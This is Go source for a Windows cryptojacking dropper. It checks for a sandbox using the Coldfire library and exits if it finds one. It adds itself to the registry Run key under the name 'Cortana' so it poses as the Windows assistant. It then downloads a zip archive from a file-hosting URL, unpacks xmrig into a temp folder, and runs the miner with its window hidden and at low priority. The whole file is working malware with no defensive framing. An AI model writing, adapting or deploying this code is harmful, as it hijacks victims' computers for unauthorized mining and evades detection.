// Main package
package main

// Import needed libraties
import (
	"archive/zip"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/redcode-labs/Coldfire"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// Func that downloads files
func downloadFile(filepath string, url string) (err error) {
	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	// Writer the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	return nil
}

// Func that unzips the source file and archives within that file
func unzipSource(source, destination string) error {
	// 1. Open the zip file
	reader, err := zip.OpenReader(source)
	if err != nil {
		return err
	}
	defer reader.Close()

	// 2. Get the absolute destination path
	destination, err = filepath.Abs(destination)
	if err != nil {
		return err
	}

	// 3. Iterate over zip files inside the archive and unzip each of them
	for _, f := range reader.File {
		err := unzipFile(f, destination)
		if err != nil {
			return err
		}
	}

	return nil
}

// Func that unzips files
func unzipFile(f *zip.File, destination string) error {
	// 4. Check if file paths are not vulnerable to Zip Slip
	filePath := filepath.Join(destination, f.Name)
	if !strings.HasPrefix(filePath, filepath.Clean(destination)+string(os.PathSeparator)) {
		return fmt.Errorf("invalid file path: %s", filePath)
	}

	// 5. Create directory tree
	if f.FileInfo().IsDir() {
		if err := os.MkdirAll(filePath, os.ModePerm); err != nil {
			return err
		}
		return nil
	}

	if err := os.MkdirAll(filepath.Dir(filePath), os.ModePerm); err != nil {
		return err
	}

	// 6. Create a destination file for unzipped content
	destinationFile, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	// 7. Unzip the content of a file and copy it to the destination file
	zippedFile, err := f.Open()
	if err != nil {
		return err
	}
	defer zippedFile.Close()

	if _, err := io.Copy(destinationFile, zippedFile); err != nil {
		return err
	}
	return nil
}

// Func that starts the xmrig command/process
func startCommand(dir string) {
	cmd := exec.Command(filepath.Join(dir, "cortanacache", "xmrig.exe"), "-c", filepath.Join(dir, "cortanacache", "config.json"))

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	if err := cmd.Start(); err != nil {
		log.Printf("Failed to start cmd: %v", err)
	}

	handle, err := syscall.OpenProcess(windows.PROCESS_SET_INFORMATION, false, uint32(cmd.Process.Pid))
	if err != nil {
		log.Println("Error getting process handle:", err)
	}

	err = windows.SetPriorityClass(windows.Handle(handle), windows.IDLE_PRIORITY_CLASS)
	if err != nil {
		log.Println("Error setting process priority:", err)
	}

	// And when you need to wait for the command to finish:
	if err := cmd.Wait(); err != nil {
		log.Printf("Cmd returned error: %v", err)
	}
}

// Func that puts this binary into autostart
func autoStart() {
	key, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		log.Fatal(err)
	}
	defer key.Close()

	loc, _ := os.Executable()
	err = key.SetStringValue("Cortana", loc)
	if err != nil {
		log.Fatal(err)
	}
}

// Main func that initializes everything
func main() {
	f, err := os.OpenFile("cortanalog.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("error opening file: %v", err)
	}
	defer f.Close()
	log.SetOutput(f)

	if coldfire.SandboxAll() {
		log.Println("SOMEERROR ;)")
		os.Exit(0)
	}

	autoStart()

	dir, err := ioutil.TempDir("", "cortanacache")
	if err != nil {
		log.Fatal(err)
	}
	defer os.RemoveAll(dir)

	err = downloadFile(filepath.Join(dir, "cortanacache.zip"), "https://files.catbox.moe/g9ivbr.zip")
	if err != nil {
		log.Fatalf("error downloading file: %v", err)
	}

	err = unzipSource(filepath.Join(dir, "cortanacache.zip"), filepath.Join(dir, "cortanacache"))
	if err != nil {
		log.Fatal(err)
	}

	startCommand(dir)
}
